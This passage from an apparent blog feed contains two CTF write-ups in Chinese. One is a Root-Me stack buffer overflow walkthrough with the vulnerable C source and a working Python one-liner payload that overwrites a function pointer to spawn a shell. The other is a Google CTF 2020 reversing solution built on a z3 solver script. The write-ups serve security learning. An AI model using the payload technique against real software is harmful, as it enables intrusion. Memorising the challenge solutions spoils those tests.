    <content type="html"><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-2"><a href="#ELF-x86-Stack-buffer-overflow-basic-2" class="headerlink" title="ELF x86 - Stack buffer overflow basic 2"></a>ELF x86 - Stack buffer overflow basic 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> var;</span><br><span class="line">    <span class="keyword">void</span> (*func)()=sup;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    fgets(buf,<span class="number">133</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a> <h3 id="反汇编代码"><a href="#反汇编代码" class="headerlink" title="反汇编代码"></a>反汇编代码</h3><p><a href="https://imgchr.com/i/DCSycj"><img src="https://s3.ax1x.com/2020/11/14/DCSycj.jpg" alt="DCSycj.jpg"></a></p><p>获取输入后，调用eax寄存器中函数<br>输入存在<code>ebp-0x8c</code>, <code>ebp-0xc</code> 处保存着sup函数地址， 我们要做的就是将该地址换为shell()函数地址</p><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p><a href="https://imgchr.com/i/DCp9vd"><img src="https://s3.ax1x.com/2020/11/14/DCp9vd.jpg" alt="DCp9vd.jpg"></a></p><p>128字节后，即<code>0xbffffa9c（ebp-0xc)</code>处保存sup()函数地址<br>所以可以直接溢出</p><h3 id="替换为shell"><a href="#替换为shell" class="headerlink" title="替换为shell()"></a>替换为shell()</h3><p>查看shell()函数地址<br><a href="https://imgchr.com/i/DCpgRe"><img src="https://s3.ax1x.com/2020/11/14/DCpgRe.jpg" alt="DCpgRe.jpg"></a><br>为<code>0x08048516</code></p><h3 id="palyload"><a href="#palyload" class="headerlink" title="palyload"></a>palyload</h3><p><code>(python -c &#39;print &quot;a&quot;*128+&quot;08048516&quot;.decode(&quot;hex&quot;)[::-1]&#39;;cat) | ./ch15</code><br>“08048516”.decode(“hex”) 十六进制表示，所以用十六进制解码</p><pre><code>┌─[✗]─[zentreisender@parrotos]─[~/Documents/root_me/app_system]└──╼ $pythonPython 2.7.18 (default, Apr 20 2020, 20:30:41) [GCC 9.3.0] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; &quot;08048516&quot;.decode(&quot;hex&quot;)&#39;\x08\x04\x85\x16&#39;&gt;&gt;&gt; &quot;08048516&quot;.encode(&quot;hex&quot;)&#39;3038303438353136&#39;&gt;&gt;&gt; </code></pre><p>注意python中的<code>&#39;</code> <code>&quot;</code><br><a href="https://imgchr.com/i/DC9Ay9"><img src="https://s3.ax1x.com/2020/11/14/DC9Ay9.jpg" alt="DC9Ay9.jpg"></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Stack-buffer-overflow-basic-2&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-2&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 2&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 2&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setreuid(geteuid(), geteuid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    system(&lt;span class=&quot;string&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;sup&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; var;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*func)()=sup;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fgets(buf,&lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;,&lt;span class=&quot;built_in&quot;&gt;stdin&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    func();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>google_ctf2020_RCE-beginner</title>
    <link href="http://finsenty54.github.io/2020/11/13/google_ctf2020_RCE-beginner/"/>
    <id>http://finsenty54.github.io/2020/11/13/google_ctf2020_RCE-beginner/</id>
    <published>2020-11-13T09:03:12.000Z</published>
    <updated>2020-11-13T09:04:49.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="google-ctf"><a href="#google-ctf" class="headerlink" title="google_ctf"></a>google_ctf</h2><h3 id="RCE-beginner"><a href="#RCE-beginner" class="headerlink" title="RCE beginner"></a>RCE beginner</h3><p><strong>z3有用的链接：</strong></p><ul><li><a href="http://z3prover.github.io/api/html/namespacez3py.html#nested-classes" title="z3 API ">z3 API </a></li><li><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" title="z3 英语教程翻译">z3 英语教程翻译</a><br>（好多东西没说）<a id="more"></a></li></ul><hr><p>我想用z3来解决问题，但是不熟悉，很多操作不会，直接GG<br><a href="https://ctftime.org/writeup/23052" title="使用z3解决的wp">使用z3解决的wp</a> 我参考了这篇，熟悉了API（<code>Contact()</code>,<code>Extract()</code>,小学了下python，变量只用声明一个就行，我声明的太多了，后面的+，xor操作完全不成功。</p><pre><code>list(map(lambda i:flag[i], new_pshufb))int.from_bytes(bytearray(new_xor), byteorder=&quot;big&quot;)将序列直接变成了整数</code></pre><hr><p>程序主要将输入进行三个操作：SHUFFLE, ADD32, XOR<br>最后进行条件判断<br><a href="https://imgchr.com/i/DprQNd"><img src="https://s3.ax1x.com/2020/11/13/DprQNd.jpg" alt="DprQNd.jpg"></a><br>这是数据在内存中的排列布局；<br><code>0x7fffffffddf0 </code>是输入值 <code>adcdefg12345678</code></p><hr><p>下面是参考的代码，注释部分是我写的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dword_from_bytes</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="comment"># Create a Z3 bit-vector concatenation expression.串联表达式。</span></span><br><span class="line">    <span class="keyword">return</span> Concat(b[<span class="number">3</span>],b[<span class="number">2</span>],b[<span class="number">1</span>],b[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap_endian</span>(<span class="params">b</span>):</span></span><br><span class="line">    <span class="comment">#simplify(Extract(StringVal(&quot;abcd&quot;),2,1)) &quot;c&quot;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;从0计数，调整为位序，</span></span><br><span class="line"><span class="string">    最先ef be ad 现在是 ad be ef最后</span></span><br><span class="line"><span class="string">    76 58 b4 </span></span><br><span class="line"><span class="string">    extract(7,0) 就是将最后8位调前</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    b3 = Extract(<span class="number">31</span>, <span class="number">24</span>, b)</span><br><span class="line">    b2 = Extract(<span class="number">23</span>, <span class="number">16</span>, b)</span><br><span class="line">    b1 = Extract(<span class="number">15</span>, <span class="number">8</span>, b)</span><br><span class="line">    b0 = Extract(<span class="number">7</span>, <span class="number">0</span>, b)</span><br><span class="line">    <span class="keyword">return</span> Concat(b0, b1, b2, b3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;give me a bottle of rum!&quot;</span>)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;dou kan cheng 128 bit&#x27;&#x27;&#x27;</span></span><br><span class="line">    flag = [BitVec(<span class="string">&#x27;c&#x27;</span>+<span class="built_in">str</span>(i), <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dest = []</span></span><br><span class="line">    pshufb = <span class="string">&#x27;000D0C0A08040F030E090B0501070602&#x27;</span></span><br><span class="line">    new_pshufb = []</span><br><span class="line">    <span class="comment"># new_dest = []</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pshufb), <span class="number">2</span>):</span><br><span class="line">        new_pshufb.append(<span class="built_in">int</span>(pshufb[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># new_pshufb.append(binascii.unhexlify(pshufb[i]+pshufb[i+1])[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    new_pshufb.reverse()</span><br><span class="line">    print(new_pshufb)</span><br><span class="line">    <span class="comment"># new_pshufb = [IntVal(i) for i in new_pshufb]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># dest = [Int(&#x27;flag%d&#x27; % i) for i in range(16)]</span></span><br><span class="line">    <span class="comment"># new_dest = [Int(&#x27;flag%d&#x27; % i) for i in range(16)]</span></span><br><span class="line">    <span class="comment"># pshufb  xmm0, xmmword [rel SHUFFLE]</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;for i in range(16):</span></span><br><span class="line"><span class="string">    if 0x80 == new_pshufb[i] &amp; 0x80:</span></span><br><span class="line"><span class="string">            And</span></span><br><span class="line"><span class="string">            new_dest[i] = &#x27;00&#x27;</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">    new_dest[i] = (dest[new_pshufb[i].as_long() % 16])&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># python3 由于map()返回一个迭代器，因此我们使用了list()函数立即生成结果</span></span><br><span class="line">    output=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> i:flag[i], new_pshufb))</span><br><span class="line"></span><br><span class="line">    p3 = dword_from_bytes(output[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    p2 = dword_from_bytes(output[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">    p1 = dword_from_bytes(output[<span class="number">8</span>:<span class="number">12</span>])</span><br><span class="line">    p0 = dword_from_bytes(output[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># paddd   xmm0, xmmword [rel ADD32]</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;add32 = &#x27;6763746613371337FEE1DEADDEADBEEF&#x27;</span></span><br><span class="line"><span class="string">    new_add32 = []</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for i in range(0, len(add32), 2):</span></span><br><span class="line"><span class="string">        new_add32.append(int(add32[i:i+2], 16))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    new_add32.reverse()</span></span><br><span class="line"><span class="string">    new_add32 = [IntVal(i) for i in new_add32]</span></span><br><span class="line"><span class="string">    for i in range(4):</span></span><br><span class="line"><span class="string">    x=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    y=&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for j in range(4):</span></span><br><span class="line"><span class="string">    x.join(format(new_add32[i*4+j].as_long(),&#x27;x&#x27;))</span></span><br><span class="line"><span class="string">    y.join(format(new_dest[i*4+j],&#x27;x&#x27;))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    tmp=(BitVec(new_add32[i*4:i*4+4],32)+BitVec(new_add32[i*4:i*4+4],32))&amp;BitVec(0xffffffffff,32)&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#定义上只有32位，所以不考虑进位</span></span><br><span class="line">    p3 = (p3 + <span class="number">0xdeadbeef</span>)</span><br><span class="line">    p2 = (p2 + <span class="number">0xfee1dead</span>)</span><br><span class="line">    p1 = (p1 + <span class="number">0x13371337</span>)</span><br><span class="line">    p0 = (p0 + <span class="number">0x67637466</span>) </span><br><span class="line"></span><br><span class="line">    output = Concat(swap_endian(p3), </span><br><span class="line">                    swap_endian(p2), </span><br><span class="line">                    swap_endian(p1), </span><br><span class="line">                    swap_endian(p0))</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;tmp = (int(x, 16) +</span></span><br><span class="line"><span class="string">    int(y, 16)) &amp; 0xffffffff</span></span><br><span class="line"><span class="string">    tmp = format(tmp, &#x27;x&#x27;)</span></span><br><span class="line"><span class="string">    new4_dest = []</span></span><br><span class="line"><span class="string">    for j in range(0, len(tmp), 2):</span></span><br><span class="line"><span class="string">    new4_dest.append(int(tmp[j:j+2],16))</span></span><br><span class="line"><span class="string">    new_dest[i*4:i*4+4] = new4_dest&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    xor = <span class="string">&#x27;AAF986EB34F823D4385F1A8D49B45876&#x27;</span></span><br><span class="line">    new_xor = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(xor), <span class="number">2</span>):</span><br><span class="line">        new_xor.append(<span class="built_in">int</span>(xor[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    new_xor.reverse()</span><br><span class="line">    <span class="comment">#new_xor = [IntVal(i) for i in new_xor]</span></span><br><span class="line">    <span class="comment"># pxor    xmm0, xmmword [rel XOR]</span></span><br><span class="line">    xor_val = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytearray</span>(new_xor), byteorder=<span class="string">&quot;big&quot;</span>)<span class="comment">#big 表示大端序 即末尾放在高地址处 即顺序保持不变</span></span><br><span class="line">    output = output ^ xor_val</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;final_dest = [Int(&#x27;flag%d&#x27; % i) for i in range(16)]</span></span><br><span class="line"><span class="string">    for (i, j) in zip(new_dest, new_xor):</span></span><br><span class="line"><span class="string">    final_dest.append(format(i ^ j, &#x27;x&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#solver.add(final_dest == dest)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        high = ((<span class="number">16</span> - i) * <span class="number">8</span>) - <span class="number">1</span> </span><br><span class="line">        low = ((<span class="number">16</span> - i) * <span class="number">8</span>) - <span class="number">8</span></span><br><span class="line">        solver.add(flag[i] == Extract(high, low, output))    </span><br><span class="line">        <span class="comment">#最高位127~120 ， 表示第一个字节</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ctf = &#x27;CTF&#123;&#x27;</span></span><br><span class="line"><span class="string">    for i in range(4):</span></span><br><span class="line"><span class="string">    solver.add(chr(int(final_dest[i])) == ctf[i])&#x27;&#x27;&#x27;</span></span><br><span class="line">    solver.add(flag[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>))</span><br><span class="line">    solver.add(flag[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">    solver.add(flag[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line">    solver.add(flag[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        m = solver.model()</span><br><span class="line">        <span class="comment">#s = []</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;for i in range(16):</span></span><br><span class="line"><span class="string">            s.append(m[dest[i]].as_long())&#x27;&#x27;&#x27;</span></span><br><span class="line">        print(<span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: m[x].as_long(), flag)).decode())</span><br><span class="line">        print(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>成功！<br><a href="https://imgchr.com/i/Dprsg0"><img src="https://s3.ax1x.com/2020/11/13/Dprsg0.jpg" alt="Dprsg0.jpg"></a></p><hr><p>还有用angr的，但我在机子上试了下都不成功</p><ul><li><a href="https://github.com/Dvd848/CTFs/blob/master/2020_GoogleCTF/Beginner.md" title="方法1">方法1</a></li><li><a href="https://gist.github.com/CreateRemoteThread/53d53b0b4a10346dabb9392231b81955" title="方法2">方法2</a></li><li><a href="https://www.youtube.com/watch?v=RCgEIBfnTEI" title="视频">视频</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;google-ctf&quot;&gt;&lt;a href=&quot;#google-ctf&quot; class=&quot;headerlink&quot; title=&quot;google_ctf&quot;&gt;&lt;/a&gt;google_ctf&lt;/h2&gt;&lt;h3 id=&quot;RCE-beginner&quot;&gt;&lt;a href=&quot;#RCE-beginner&quot; class=&quot;headerlink&quot; title=&quot;RCE beginner&quot;&gt;&lt;/a&gt;RCE beginner&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;z3有用的链接：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://z3prover.github.io/api/html/namespacez3py.html#nested-classes&quot; title=&quot;z3 API &quot;&gt;z3 API &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/&quot; title=&quot;z3 英语教程翻译&quot;&gt;z3 英语教程翻译&lt;/a&gt;&lt;br&gt;（好多东西没说）</summary>
    
    
    
    <category term="google_ctf" scheme="http://finsenty54.github.io/categories/google-ctf/"/>
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>PWN keep going</title>
    <link href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/"/>
    <id>http://finsenty54.github.io/2020/11/10/PWN_keep_going/</id>
    <published>2020-11-10T01:33:50.000Z</published>
    <updated>2020-11-11T01:25:17.194Z</updated>
    
